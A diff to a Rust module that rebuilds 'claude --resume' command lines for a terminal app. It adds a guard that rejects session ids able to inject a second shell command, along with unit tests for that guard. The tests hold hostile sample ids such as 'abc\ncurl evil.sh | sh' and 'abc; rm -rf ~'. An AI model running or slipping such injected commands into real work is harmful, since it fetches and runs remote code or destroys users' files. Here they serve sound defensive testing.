@@ -75,7 +75,14 @@ fn proc_info(pid: u32) -> Option<(u32, u64)> {
 fn parse_session_file(data: &str) -> Option<(u32, u64, Session)> {
     let json = serde_json::from_str::<serde_json::Value>(data).ok()?;
     let pid = json.get("pid").and_then(|v| v.as_u64())? as u32;
-    let id = json.get("sessionId").and_then(|v| v.as_str())?.to_string();
+    let id = json.get("sessionId").and_then(|v| v.as_str())?;
+    if !is_safe_session_id(id) {
+        // Never log the value itself: it would carry whatever it holds — control
+        // characters included — into a log file someone later reads in a terminal.
+        log::warn!("Ignoring Claude session file with a non-plain sessionId");
+        return None;
+    }
+    let id = id.to_string();
     let started_at = json.get("startedAt").and_then(|v| v.as_u64())? / 1000;
     // `name` is absent until the session is named, and Claude Code accepts a
     // blank one, so an all-whitespace name counts as no name at all.
@@ -157,13 +164,34 @@ pub fn for_shell(shell_pid: u32) -> Option<String> {
     session_for_shell(shell_pid).map(|s| s.id)
 }
 
+/// True if `id` is safe to splice into a command line.
+///
+/// The id comes from a file Kova does not write — and, on restore, from a session
+/// file that may be older than this build. `resume_command` puts it in a line that
+/// goes straight to the PTY, so a newline inside it would end the `claude` line and
+/// run the rest on its own, no Enter needed. Claude Code writes a UUID here, so
+/// anything outside `[A-Za-z0-9_-]` is refused rather than escaped.
+fn is_safe_session_id(id: &str) -> bool {
+    !id.is_empty()
+        && id
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+}
+
 /// Build the command line that reopens `session_id`, reusing the flags of the
 /// command that started it where possible.
 ///
 /// `claude --resume <id>` only finds the conversation from the directory it was
 /// started in, so the caller must inject this into a pane restored with the
 /// original cwd.
-pub fn resume_command(last_command: Option<&str>, session_id: &str) -> String {
+///
+/// `None` when the id is not one we are willing to type into a shell — the caller
+/// falls back to whatever the pane was doing before.
+pub fn resume_command(last_command: Option<&str>, session_id: &str) -> Option<String> {
+    if !is_safe_session_id(session_id) {
+        log::warn!("Refusing to build a resume line from a non-plain session id");
+        return None;
+    }
     let base = last_command
         .map(str::trim)
         .filter(|cmd| is_claude_invocation(cmd))
@@ -171,7 +199,7 @@ pub fn resume_command(last_command: Option<&str>, session_id: &str) -> String {
         .filter(|tokens| !tokens.is_empty())
         .unwrap_or_else(|| vec!["claude".to_string()]);
 
-    format!("{} --resume {}", base.join(" "), session_id)
+    Some(format!("{} --resume {}", base.join(" "), session_id))
 }
 
 /// True if `cmd` starts with a plain `claude` invocation (no alias, no env
@@ -279,31 +307,56 @@ mod tests {
         assert!(parse_session_file(r#"{"pid":1,"startedAt":1000}"#).is_none());
     }
 
+    /// The expectations below read better without the `Option`; the refusal path
+    /// has its own tests.
+    fn resume(last_command: Option<&str>, session_id: &str) -> String {
+        resume_command(last_command, session_id).expect("a plain id must build a line")
+    }
+
     #[test]
     fn resume_from_plain_claude() {
-        assert_eq!(resume_command(Some("claude"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("claude"), "abc"), "claude --resume abc");
+    }
+
+    #[test]
+    fn a_session_id_that_could_carry_a_second_command_is_refused() {
+        // The line is written to the PTY without a trailing Enter, so a newline
+        // inside the id is what turns the tail into a command of its own.
+        assert_eq!(resume_command(Some("claude"), "abc\ncurl evil.sh | sh"), None);
+        assert_eq!(resume_command(Some("claude"), "abc; rm -rf ~"), None);
+        assert_eq!(resume_command(Some("claude"), "abc $(whoami)"), None);
+        assert_eq!(resume_command(Some("claude"), ""), None);
+        // A real id — a UUID — still goes through.
+        assert!(resume_command(None, "430e0c8f-1e4b-4a7d-9f2c-000000000000").is_some());
+    }
+
+    #[test]
+    fn a_session_file_naming_such_an_id_is_ignored_whole() {
+        // Same guard at the other door: the id never even reaches a pane.
+        let data = r#"{"pid":1,"sessionId":"abc\nsay hello","startedAt":1000}"#;
+        assert!(parse_session_file(data).is_none());
     }
 
     #[test]
     fn resume_without_known_command() {
-        assert_eq!(resume_command(None, "abc"), "claude --resume abc");
+        assert_eq!(resume(None, "abc"), "claude --resume abc");
     }
 
     #[test]
     fn resume_keeps_original_flags() {
         assert_eq!(
-            resume_command(Some("claude --dangerously-skip-permissions"), "abc"),
+            resume(Some("claude --dangerously-skip-permissions"), "abc"),
             "claude --dangerously-skip-permissions --resume abc"
         );
     }
 
     #[test]
     fn resume_replaces_previous_session_selection() {
-        assert_eq!(resume_command(Some("claude --resume old-id"), "abc"), "claude --resume abc");
-        assert_eq!(resume_command(Some("claude -r old-id"), "abc"), "claude --resume abc");
-        assert_eq!(resume_command(Some("claude --continue"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("claude --resume old-id"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("claude -r old-id"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("claude --continue"), "abc"), "claude --resume abc");
         assert_eq!(
-            resume_command(Some("claude --session-id 1234 --debug"), "abc"),
+            resume(Some("claude --session-id 1234 --debug"), "abc"),
             "claude --debug --resume abc"
         );
     }
@@ -311,22 +364,22 @@ mod tests {
     #[test]
     fn resume_keeps_a_flag_that_follows_a_valueless_resume() {
         // `claude --resume` with no id opens the picker; the next token is a flag.
-        assert_eq!(resume_command(Some("claude --resume --debug"), "abc"), "claude --debug --resume abc");
+        assert_eq!(resume(Some("claude --resume --debug"), "abc"), "claude --debug --resume abc");
     }
 
     #[test]
     fn resume_falls_back_when_the_command_is_not_a_plain_claude_call() {
         // An alias, an env prefix or a pipeline cannot be rewritten safely.
-        assert_eq!(resume_command(Some("cc"), "abc"), "claude --resume abc");
-        assert_eq!(resume_command(Some("RUST_LOG=debug claude"), "abc"), "claude --resume abc");
-        assert_eq!(resume_command(Some("claude | tee log"), "abc"), "claude --resume abc");
-        assert_eq!(resume_command(Some(""), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("cc"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("RUST_LOG=debug claude"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some("claude | tee log"), "abc"), "claude --resume abc");
+        assert_eq!(resume(Some(""), "abc"), "claude --resume abc");
     }
 
     #[test]
     fn resume_accepts_an_absolute_path_to_claude() {
         assert_eq!(
-            resume_command(Some("/opt/homebrew/bin/claude"), "abc"),
+            resume(Some("/opt/homebrew/bin/claude"), "abc"),
             "/opt/homebrew/bin/claude --resume abc"
         );
     }
